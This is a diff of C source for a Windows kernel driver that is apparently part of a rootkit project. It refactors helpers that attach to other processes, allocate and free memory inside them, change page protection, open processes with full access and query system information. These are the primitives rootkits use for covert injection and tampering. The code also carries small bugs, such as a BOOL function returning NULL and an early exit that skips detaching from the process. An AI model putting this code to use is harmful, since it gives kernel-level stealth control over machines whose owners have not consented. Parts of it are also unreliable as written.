@@ -2,68 +2,60 @@
 #pragma warning(disable:4996)
 
 
-// general namespace:
 BOOL general::FreeAllocatedMemoryADD(PEPROCESS EpDst, ULONG OldState, PVOID BufferAddress, SIZE_T BufferSize) {
 	KAPC_STATE DstState = { 0 };
-	NTSTATUS status = STATUS_UNSUCCESSFUL;
-	MEMORY_BASIC_INFORMATION mbi = { 0 };
+	NTSTATUS Status = STATUS_UNSUCCESSFUL;
+	MEMORY_BASIC_INFORMATION MemoryBasic = { 0 };
 
-	// Query the memory area to get newer status update -
-	KeStackAttachProcess(EpDst, &DstState);  // attach to destination process
 
-	status = ZwQueryVirtualMemory(ZwCurrentProcess(), BufferAddress, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);
-	if (!NT_SUCCESS(status)) {
-		DbgPrintEx(0, 0, "KMDFdriver FreeAllocatedMemoryADD FAILED - CANNOT GET A RECENT MEMORY QUERY TO VERIFY STATE\n");
-		KeUnstackDetachProcess(&DstState);  // detach from the destination process
+	// Check for invalid paramters:
+	if (EpDst == NULL || BufferAddress == NULL || BufferSize == 0) {
+		return NULL;
+	}
+
+
+	// Query the memory area to get newer status update:
+	KeStackAttachProcess(EpDst, &DstState);
+	Status = ZwQueryVirtualMemory(ZwCurrentProcess(), BufferAddress, MemoryBasicInformation, &MemoryBasic, sizeof(MemoryBasic), NULL);
+	if (!NT_SUCCESS(Status)) {
+		KeUnstackDetachProcess(&DstState);
 		return FALSE;
 	}
 
-	if (mbi.AllocationBase == BufferAddress) {
-		switch (mbi.State) {
-		case MEM_COMMIT:
-			// Range is committed -
 
+	// Free memory if needed:
+	if (MemoryBasic.AllocationBase == BufferAddress) {
+		switch (MemoryBasic.State) {
+		case MEM_COMMIT:
 			if (!(OldState & MEM_RESERVE)) {
-				status = ZwFreeVirtualMemory(ZwCurrentProcess(), &BufferAddress, &BufferSize, MEM_RELEASE);  // Release the unused memory
+				Status = ZwFreeVirtualMemory(ZwCurrentProcess(), &BufferAddress, &BufferSize, MEM_RELEASE);  // Release the unused memory
 			}
 			else {
-				status = ZwFreeVirtualMemory(ZwCurrentProcess(), &BufferAddress, &BufferSize, MEM_DECOMMIT);  // de-commit the unused memory
+				Status = ZwFreeVirtualMemory(ZwCurrentProcess(), &BufferAddress, &BufferSize, MEM_DECOMMIT);  // De-commit the unused memory
 			}
-			KeUnstackDetachProcess(&DstState);  // detach from the destination process
-
-			if (!NT_SUCCESS(status)) {
-				DbgPrintEx(0, 0, "KMDFdriver FreeAllocatedMemoryADD FAILED - CANNOT FREE UNUSED MEMORY/DECOMMIT RESERVED MEMORY (NOW IS COMMITTED)\n");
+			KeUnstackDetachProcess(&DstState);
+			if (!NT_SUCCESS(Status)) {
 				return FALSE;
 			}
 			return TRUE;
 
 		case MEM_RESERVE:
-			// Range is reserved -
-
 			if (!(OldState & MEM_RESERVE)) {
-				status = ZwFreeVirtualMemory(ZwCurrentProcess(), &BufferAddress, &BufferSize, MEM_RELEASE);  // Release the unused memory
+				Status = ZwFreeVirtualMemory(ZwCurrentProcess(), &BufferAddress, &BufferSize, MEM_RELEASE);  // Release the unused memory
 			}
-			KeUnstackDetachProcess(&DstState);  // detach from the destination process
-
-			if (!NT_SUCCESS(status)) {
-				DbgPrintEx(0, 0, "KMDFdriver FreeAllocatedMemoryADD FAILED - CANNOT FREE UNUSED MEMORY (NOW IS RESERVED)\n");
+			KeUnstackDetachProcess(&DstState);
+			if (!NT_SUCCESS(Status)) {
 				return FALSE;
 			}
 			return TRUE;
 
 		default:
-			// Range is free -
-
 			KeUnstackDetachProcess(&DstState);  // detach from the destination process
-			DbgPrintEx(0, 0, "KMDFdriver FreeAllocatedMemoryADD SUCCEEDED - NOW IS FREED, NOTHING TO BE DONE\n");
 			return TRUE;
 		}
 	}
 	else {
-		// Range is allocated in memory but not by me -
-
-		KeUnstackDetachProcess(&DstState);  // detach from the destination process
-		DbgPrintEx(0, 0, "KMDFdriver FreeAllocatedMemoryADD SUCCEEDED - CURRENT ALLOCATION != MINE, NOTHING TO BE DONE\n");
+		KeUnstackDetachProcess(&DstState);
 		return TRUE;
 	}
 }
@@ -72,116 +64,93 @@ BOOL general::FreeAllocatedMemoryADD(PEPROCESS EpDst, ULONG OldState, PVOID Buff
 
 
 PVOID general::AllocateMemoryADD(PVOID InitialAddress, SIZE_T AllocSize, KAPC_STATE* CurrState, ULONG_PTR ZeroBits) {
-	MEMORY_BASIC_INFORMATION mbi = { 0 };
+	MEMORY_BASIC_INFORMATION MemoryBasic = { 0 };
 	PVOID AllocationAddress = NULL;
-	NTSTATUS status = STATUS_UNSUCCESSFUL;
-	BOOL ProtChanged = FALSE;
+	NTSTATUS Status = STATUS_UNSUCCESSFUL;
+	
 
-	// Initial query of memory (to confirm state and other parameters) -
+	// Check for invalid paramters:
+	if (InitialAddress == NULL || AllocSize == 0) {
+		return NULL;
+	}
+
+
+	// Initial query of memory (to confirm state and other parameters):
 	__try {
 		ProbeForRead(InitialAddress, AllocSize, sizeof(UCHAR));
-		status = ZwQueryVirtualMemory(ZwCurrentProcess(), InitialAddress, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);
+		Status = ZwQueryVirtualMemory(ZwCurrentProcess(), InitialAddress, MemoryBasicInformation, &MemoryBasic, sizeof(MemoryBasic), NULL);
 
-		if (!NT_SUCCESS(status)) {
-			KeUnstackDetachProcess(CurrState);  // detach from the process
-			DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD FAILED - CANNOT QUERY VIRTUAL MEMORY TO VERIFY STATE\n");
+		if (!NT_SUCCESS(Status)) {
+			KeUnstackDetachProcess(CurrState);
 			return NULL;
 		}
 	}
 
 	__except (STATUS_ACCESS_VIOLATION) {
-		KeUnstackDetachProcess(CurrState);  // detach from the process
-		DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD FAILED - VIRTMEM ADDRESS IS NOT IN THE ADDRESS RANGE/ITS NOT READABLE FOR VIRTMEMQUERY\n");
+		KeUnstackDetachProcess(CurrState);
 		return NULL;
 	}
 
 
-	// Notify on initial memory status -
-	if (mbi.Protect & PAGE_NOACCESS) {
-		DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - MEMORY RANGE IS INITIALLY PAGE_NOACCESS PROTECTED\n");
-		ProtChanged = ChangeProtectionSettingsADD(ZwCurrentProcess(), InitialAddress, (ULONG)AllocSize, PAGE_READWRITE, mbi.Protect);
-		if (ProtChanged) {
-			DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - MEMORY RANGE SUCCESSFULLY CHANGED FROM PAGE_NOACCESS PROTECTED TO PAGE_READWRITE PROTECTED\n");
-		}
-		else {
-			DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - COULD NOT CHANGE PROTECTION FROM PAGE_NOACCESS PROTECTED (WILL PROB GIVE OUT ANOTHER MEMREGION)\n");
-		}
+	// Act upon initial memory status:
+	if (MemoryBasic.Protect & PAGE_NOACCESS) {
+		ChangeProtectionSettingsADD(ZwCurrentProcess(), InitialAddress, (ULONG)AllocSize, PAGE_READWRITE, MemoryBasic.Protect);
 	}
 
-	// Set the initial allocation base for each memory state -
-	if (mbi.State & MEM_FREE) {
-		// Range is free -
-		DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - MEMORY RANGE IS CURRENTLY FREE\n");
+
+	// Set the initial allocation base for each memory state:
+	if (MemoryBasic.State & MEM_FREE) {
 		AllocationAddress = InitialAddress;
 	}
 
-	else if (mbi.State & MEM_RESERVE) {
-		// Range is already reserved -
-		DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - MEMORY RANGE IS CURRENTLY RESERVED\n");
-		AllocationAddress = mbi.AllocationBase;
+	else if (MemoryBasic.State & MEM_RESERVE) {
+		AllocationAddress = MemoryBasic.AllocationBase;
 
-		// Verify region size -
-		if (AllocSize > mbi.RegionSize) {
-			DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - REQUESTED MEMORY SIZE (%zu) > AVAILABLE REGION (%zu), TRYING TO RELEASE AND REQUERY..\n", AllocSize, mbi.RegionSize);
-			status = ZwFreeVirtualMemory(ZwCurrentProcess(), &mbi.AllocationBase, &mbi.RegionSize, MEM_RELEASE);
-			if (!NT_SUCCESS(status)) {
-				KeUnstackDetachProcess(CurrState);  // detach from the process
-				DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD FAILED - CANNOT FREE ALREADY RESERVED UNMATCHING MEMORY\n");
+		// Verify region size:
+		if (AllocSize > MemoryBasic.RegionSize) {
+			Status = ZwFreeVirtualMemory(ZwCurrentProcess(), &MemoryBasic.AllocationBase, &MemoryBasic.RegionSize, MEM_RELEASE);
+			if (!NT_SUCCESS(Status)) {
+				KeUnstackDetachProcess(CurrState);
 				return NULL;
 			}
 
-			status = ZwQueryVirtualMemory(ZwCurrentProcess(), InitialAddress, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);
-			if (!NT_SUCCESS(status)) {
-				KeUnstackDetachProcess(CurrState);  // detach from the process
-				DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD FAILED - CANNOT QUERY VIRTUAL MEMORY TO VERIFY STATE AFTER RELEASING ALREADY RESERVED UNMATCHING MEMORY\n");
+			Status = ZwQueryVirtualMemory(ZwCurrentProcess(), InitialAddress, MemoryBasicInformation, &MemoryBasic, sizeof(MemoryBasic), NULL);
+			if (!NT_SUCCESS(Status)) {
+				KeUnstackDetachProcess(CurrState);
 				return NULL;
 			}
 
 			AllocationAddress = InitialAddress;
-			DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - FREED ALREADY RESERVED UNMATCHING MEMORY\n");
 		}
 	}
 
 	else {
-		// Range is already committed -
-		DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - MEMORY RANGE IS CURRENTLY COMMITTED, TRYING TO FREE EXISTING COMMITTING..\n");
-		status = ZwFreeVirtualMemory(ZwCurrentProcess(), &mbi.AllocationBase, &mbi.RegionSize, MEM_RELEASE);
-		if (!NT_SUCCESS(status)) {
-			KeUnstackDetachProcess(CurrState);  // detach from the process
-			DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD FAILED - CANNOT FREE ALREADY COMMITTED MEMORY\n");
+		Status = ZwFreeVirtualMemory(ZwCurrentProcess(), &MemoryBasic.AllocationBase, &MemoryBasic.RegionSize, MEM_RELEASE);
+		if (!NT_SUCCESS(Status)) {
+			KeUnstackDetachProcess(CurrState);
 			return NULL;
 		}
 
-		status = ZwQueryVirtualMemory(ZwCurrentProcess(), InitialAddress, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);
-		if (!NT_SUCCESS(status)) {
-			KeUnstackDetachProcess(CurrState);  // detach from the process
-			DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD FAILED - CANNOT QUERY VIRTUAL MEMORY TO VERIFY STATE AFTER RELEASING ALREADY COMMITTED MEMORY\n");
+		Status = ZwQueryVirtualMemory(ZwCurrentProcess(), InitialAddress, MemoryBasicInformation, &MemoryBasic, sizeof(MemoryBasic), NULL);
+		if (!NT_SUCCESS(Status)) {
+			KeUnstackDetachProcess(CurrState);
 			return NULL;
 		}
 
 		AllocationAddress = InitialAddress;
-		DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - FREED ALREADY COMMITTED MEMORY\n");
 	}
-	DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - ALIGNED INITIAL ADDRESS FROM %p TO %p\n", InitialAddress, AllocationAddress);
 
 
-	// Verify region size -
-	if (AllocSize > mbi.RegionSize) {
-		KeUnstackDetachProcess(CurrState);  // detach from the process
-		DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD FAILED - REQUESTED MEMORY SIZE (%zu) > AVAILABLE REGION (%zu)\n", AllocSize, mbi.RegionSize);
+	// Verify updated region size:
+	if (AllocSize > MemoryBasic.RegionSize) {
+		KeUnstackDetachProcess(CurrState);
 		return NULL;
 	}
 
 
-	// Allocate the actual memory -
+	// Allocate the actual memory:
 	AllocationAddress = CommitMemoryRegionsADD(ZwCurrentProcess(), AllocationAddress, AllocSize, PAGE_READWRITE, NULL, ZeroBits);
-	KeUnstackDetachProcess(CurrState);  // detach from the process
-	if (AllocationAddress == NULL) {
-		DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD FAILED - COMMITTING FAILED\n");
-	}
-	else {
-		DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD SUCCESS (RANGE ALLIGNED TO %p)\n", AllocationAddress);
-	}
+	KeUnstackDetachProcess(CurrState);
 	return AllocationAddress;
 }
 
@@ -213,85 +182,179 @@ NTSTATUS general::ExitRootkitRequestADD(PEPROCESS From, PEPROCESS To, ROOTKIT_ST
 
 
 
-// reuests namespace:
-RKSYSTEM_INFORET requests::RequestSystemInfoADD(SYSTEM_INFORMATION_CLASS InfoType, ULONG64 Flag, DWORD SysInfNum) {
-	NTSTATUS status = STATUS_UNSUCCESSFUL;
+NTSTATUS general::OpenProcessHandleADD(HANDLE* Process, USHORT PID) {
+	OBJECT_ATTRIBUTES ProcessAttr = { 0 };
+	CLIENT_ID ProcessCid = { 0 };
+	ProcessCid.UniqueProcess = (HANDLE)PID;
+	ProcessCid.UniqueThread = NULL;
+	InitializeObjectAttributes(&ProcessAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+	return ZwOpenProcess(Process, PROCESS_ALL_ACCESS, &ProcessAttr, &ProcessCid);;
+}
+
+
+
+
+NTSTATUS general::CopyStringAfterCharADD(PUNICODE_STRING OgString, PUNICODE_STRING NewString, WCHAR Char) {
+	SIZE_T AfterLength = 0;
+	WCHAR* CharOcc = NULL;
+
+
+	// Check for invalid paramters:
+	if (OgString->Length == 0 || OgString->Buffer == NULL) {
+		return STATUS_INVALID_PARAMETER;
+	}
+
+
+	// Find last occurance and copy string after it:
+	CharOcc = wcsrchr(OgString->Buffer, Char);
+	if (CharOcc == NULL) {
+		NewString->Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, OgString->Length, 'HlCs');
+		if (NewString->Buffer == NULL) {
+			return STATUS_MEMORY_NOT_ALLOCATED;
+		}
+		NewString->Length = OgString->Length;
+		NewString->MaximumLength = OgString->MaximumLength;
+		RtlCopyMemory(NewString->Buffer, OgString->Buffer, OgString->Length);
+		return STATUS_SUCCESS;
+	}
+	else {
+		AfterLength = OgString->Length - ((CharOcc - OgString->Buffer + 1) * sizeof(WCHAR));  // +1 to get to the character AFTER Char
+		if (AfterLength > 0){
+			NewString->Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, AfterLength, 0x53625374);
+
+			if (NewString->Buffer != NULL){
+				NewString->Length = (USHORT)AfterLength;
+				NewString->MaximumLength = (USHORT)AfterLength;
+				RtlCopyMemory(NewString->Buffer, CharOcc + 1, AfterLength);
+				return STATUS_SUCCESS;
+			}
+			else {
+				return STATUS_MEMORY_NOT_ALLOCATED;
+			}
+		}
+		else {
+			return STATUS_INVALID_PARAMETER;
+		}
+	}
+}
+
+
+
+
+BOOL general::CompareUnicodeStringsADD(PUNICODE_STRING First, PUNICODE_STRING Second, USHORT CheckLength) {
+	USHORT Size = First->Length;
+
+
+	// Check for invalid parameters:
+	if (First->Length != Second->Length || First->Buffer == NULL || Second->Buffer == NULL) {
+		return FALSE;
+	}
+
+
+	// Compare strings:
+	if (CheckLength == 0) {
+		for (USHORT i = 0; i < Size / sizeof(WCHAR); i++) {
+			if (First->Buffer[i] != Second->Buffer[i]) {
+				return FALSE;
+			}
+		}
+	}
+	else {
+		for (USHORT i = 0; i < CheckLength / sizeof(WCHAR); i++) {
+			if (First->Buffer[i] != Second->Buffer[i]) {
+				return FALSE;
+			}
+		}
+	}
+	return TRUE;
+}
+
+
+
+
+BOOL general::IsExistFromIndexADD(PUNICODE_STRING Inner, PUNICODE_STRING Outer, USHORT StartIndex) {
+	// Check for invalid parameters:
+	if (Inner->Length == 0 || Outer->Length == 0 || (StartIndex * sizeof(WCHAR)) + Inner->Length > Outer->Length || Inner->Buffer == NULL || Outer->Buffer == NULL) {
+		return FALSE;
+	}
+
+	// Compare strings:
+	for (USHORT i = 0; i < Inner->Length / sizeof(WCHAR); i++) {
+		if (Inner->Buffer[i] != Outer->Buffer[i + StartIndex]) {
+			return FALSE;
+		}
+	}
+	return TRUE;
+}
+
+
+
+
+RKSYSTEM_INFORET requests::RequestSystemInfoADD(SYSTEM_INFORMATION_CLASS InfoType, ULONG64 Flag) {
+	NTSTATUS Status = STATUS_UNSUCCESSFUL;
 	PVOID Buffer = NULL;
 	ULONG BufferSize = 0;
 	ULONG ReceivedSize = 0;
 	SIZE_T DefaultSize = 0;
 	RKSYSTEM_INFORET SysInfoRet = { 0 };
-	DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u (INFOTYPE = %llu)\n", SysInfNum, (ULONG64)InfoType);
 
-	status = ZwQuerySystemInformation(InfoType, Buffer, 0, &BufferSize);  // this call will return the needed size into BufferSize
+	Status = ZwQuerySystemInformation(InfoType, Buffer, 0, &BufferSize);  // this call will return the needed size into BufferSize
 	if (BufferSize == 0) {
-		DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u UPDATE - CANNOT GET INITIAL BUFFER SIZE WITH CALL WHEN SIZE=0, TRYING DEFAULT VALUES..\n", SysInfNum);
 		DefaultSize = GetExpectedInfoSizeADD(InfoType);  // If possible, try to predict the size needed for the buffer and use that as a last resort
 		if (DefaultSize == 0) {
-			DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u FAILED - DEFAULT VALUES ARE NOT AVAILABLE/CANNOT BE ACHIEVED AFTER INITIAL SIZE=0 ERROR\n", SysInfNum);
 			SysInfoRet.Buffer = NULL;
 			SysInfoRet.BufferSize = 0;
 		}
 		Buffer = ExAllocatePoolWithTag(NonPagedPool, DefaultSize, (ULONG)Flag);  // Allocate system information singular buffer
 		if (Buffer == NULL) {
-			DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u FAILED - COULD NOT ALLOCATE MEMORY FOR INITIAL BUFFER WITH DEFAULT SIZE (%zu) :(\n", SysInfNum, DefaultSize);
 			SysInfoRet.Buffer = NULL;
 			SysInfoRet.BufferSize = 0;
 		}
 		else {
-			// Query with the predicted value for the buffer size -
+			// Query with the predicted value for the buffer size:
 			if (!NT_SUCCESS(ZwQuerySystemInformation(InfoType, Buffer, (ULONG)DefaultSize, &ReceivedSize)) || ReceivedSize != (ULONG)DefaultSize) {
-				DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u FAILED - QUERY FOR SYSTEM INFORMATION FAILED WITH DEFAULT SIZE (%zu) :(\n", SysInfNum, DefaultSize);
 				ExFreePool(Buffer);
 				SysInfoRet.Buffer = NULL;
 				SysInfoRet.BufferSize = 0;
 			}
 			else {
-				DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u SUCCESS - QUERY FOR SYSTEM INFORMATION SUCCESS WITH DEFAULT SIZE (%zu) :(\n", SysInfNum, DefaultSize);
 				SysInfoRet.Buffer = Buffer;
 				SysInfoRet.BufferSize = DefaultSize;
 			}
 		}
 	}
 	else {
-		// Allocate an inital buffer -
+		// Allocate an inital buffer:
 		Buffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize, (ULONG)Flag);
 		if (Buffer == NULL) {
-			DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u FAILED - COULD NOT ALLOCATE MEMORY FOR INITIAL BUFFER :(\n", SysInfNum);
 			SysInfoRet.Buffer = NULL;
 			SysInfoRet.BufferSize = 0;
 		}
 		else {
-			// Query the required buffer size -
-			status = ZwQuerySystemInformation(InfoType, Buffer, BufferSize, &ReceivedSize);
-			if (NT_SUCCESS(status)) {
+			// Query the required buffer size:
+			Status = ZwQuerySystemInformation(InfoType, Buffer, BufferSize, &ReceivedSize);
+			if (NT_SUCCESS(Status)) {
 				if (ReceivedSize != BufferSize) {
-					DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u UPDATE - INFORMATION BUFFER SIZE UPDATED FROM INITAL %u TO %u (POOLBUFFER=%p)\n", SysInfNum, BufferSize, ReceivedSize, Buffer);
 					BufferSize = ReceivedSize;
 				}
-				DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u SUCCESS - SUCCEEDED FIRST TRY (BUFFERSIZE=%u, POOLBUFFER=%p, RECEIVEDSIZE=%u)\n", SysInfNum, BufferSize, Buffer, ReceivedSize);
 				SysInfoRet.BufferSize = BufferSize;
 				SysInfoRet.Buffer = Buffer;
 			}
-			else if (status == STATUS_INFO_LENGTH_MISMATCH) {
-				DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u INITIAL FAIL - LENGTH MISMATCH (BUFFERSIZE=%u, RECEIVEDSIZE=%u), TRYING AGAIN..\n", SysInfNum, BufferSize, ReceivedSize);
+			else if (Status == STATUS_INFO_LENGTH_MISMATCH) {
 				ExFreePool(Buffer);
 				Buffer = ExAllocatePoolWithTag(NonPagedPool, ReceivedSize, (ULONG)Flag);
 				if (Buffer == NULL) {
-					DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u FAILED - COULD NOT ALLOCATE MEMORY FOR SECONDARY BUFFER (INITBUFFERSIZE=%u, SECBUFFERSIZE=%u) :(\n", SysInfNum, BufferSize, ReceivedSize);
 					SysInfoRet.Buffer = NULL;
 					SysInfoRet.BufferSize = 0;
 				}
 
-				// Query the required buffer size again -
-				status = ZwQuerySystemInformation(InfoType, Buffer, ReceivedSize, NULL);
-				if (NT_SUCCESS(status)) {
-					DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u SUCCESS - SUCCEEDED AFTER INITIAL MISMATCH (POOLBUFFER=%p, RECEIVEDSIZE(BUFFERSIZE)=%lu)\n", SysInfNum, Buffer, ReceivedSize);
+				// Query the required buffer size again:
+				Status = ZwQuerySystemInformation(InfoType, Buffer, ReceivedSize, NULL);
+				if (NT_SUCCESS(Status)) {
 					SysInfoRet.BufferSize = ReceivedSize;
 					SysInfoRet.Buffer = Buffer;
 				}
 				else {
-					DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u FAILED - FAILED AFTER INITIAL MISMATCH\n", SysInfNum);
 					SysInfoRet.BufferSize = 0;
 					SysInfoRet.Buffer = NULL;
 					if (Buffer != NULL) {
@@ -308,8 +371,8 @@ RKSYSTEM_INFORET requests::RequestSystemInfoADD(SYSTEM_INFORMATION_CLASS InfoTyp
 
 
 SIZE_T requests::GetExpectedInfoSizeADD(SYSTEM_INFORMATION_CLASS InfoType) {
-	SYSTEM_BASIC_INFORMATION sbi = { 0 };
-	if (!NT_SUCCESS(ZwQuerySystemInformation(SystemBasicInformation, &sbi, sizeof(sbi), NULL))) {
+	SYSTEM_BASIC_INFORMATION SystemBasic = { 0 };
+	if (!NT_SUCCESS(ZwQuerySystemInformation(SystemBasicInformation, &SystemBasic, sizeof(SystemBasic), NULL))) {
 		return 0;
 	}
 
@@ -318,12 +381,10 @@ SIZE_T requests::GetExpectedInfoSizeADD(SYSTEM_INFORMATION_CLASS InfoType) {
 	case SystemPerformanceInformation: return sizeof(SYSTEM_PERFORMANCE_INFORMATION);
 	case SystemRegistryQuotaInformation: return sizeof(SYSTEM_REGISTRY_QUOTA_INFORMATION);
 	case SystemTimeOfDayInformation: return sizeof(SYSTEM_TIMEOFDAY_INFORMATION);
-	case SystemProcessorPerformanceInformation: return sizeof(SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION) * sbi.NumberOfProcessors;
-	case SystemInterruptInformation: return sizeof(SYSTEM_INTERRUPT_INFORMATION) * sbi.NumberOfProcessors;
+	case SystemProcessorPerformanceInformation: return sizeof(SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION) * SystemBasic.NumberOfProcessors;
+	case SystemInterruptInformation: return sizeof(SYSTEM_INTERRUPT_INFORMATION) * SystemBasic.NumberOfProcessors;
 	case SystemExceptionInformation: return sizeof(SYSTEM_EXCEPTION_INFORMATION);
-	case SystemModuleInformation: return sizeof(RTL_PROCESS_MODULES);
 	case SystemCodeIntegrityInformation: return sizeof(SYSTEM_CODEINTEGRITY_INFORMATION);
-	case SystemPolicyInformation: return sizeof(SYSTEM_POLICY_INFORMATION);
 	case SystemProcessInformation: return 0;
 	case SystemLookasideInformation: return 0;
 	default: return 0;
